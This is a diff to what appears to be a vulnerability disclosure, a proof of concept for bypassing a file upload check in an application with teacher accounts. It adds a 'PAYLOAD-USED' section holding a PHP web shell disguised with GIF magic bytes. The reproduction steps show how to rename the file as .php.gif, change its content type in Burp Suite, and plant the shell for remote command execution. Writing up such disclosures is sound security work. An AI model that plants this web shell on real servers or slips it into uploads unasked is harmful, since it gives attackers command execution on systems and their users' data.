@@ -13,6 +13,9 @@ filename, allowing any authenticated user to bypass this security check by addin
 and sending any invalid content-type. This could allow an authenticated attacker to upload HTML files with JS content 
 that will be executed in the context of the domain.
 
+## PAYLOAD-USED ##
+ ` GIF89a <?php echo system($_REQUEST['dx']); ?> `
+
 <h2>STEPS-TO-REPRODUCE</h2>
 
 1. Login into Teacher-Account with the credentials “**Username:** jogoe12@yourdomain.com”
@@ -22,7 +25,7 @@ that will be executed in the context of the domain.
 3. Open the Burp-suite and Intercept the  Edit Image Request 
 4. In POST Request Change the “ **Filename** “ from “ **profile picture.png** “  to  “**profile picture.php.gif** ” 
 5. Change the **Content-type from “ image/png “ to “ image/jpg “**
-6. And Add this **Payload** : GIF89a <?php echo system($_REQUEST['dx']); ?> 
+6. And Add this **Payload** : ` GIF89a <?php echo system($_REQUEST['dx']); ?> `
 7. Where **GIF89a is the GIF magic bytes this bypass the file upload extension**
 8. Below is the Burpsuite-POST Request for all the changes that I have made above
 
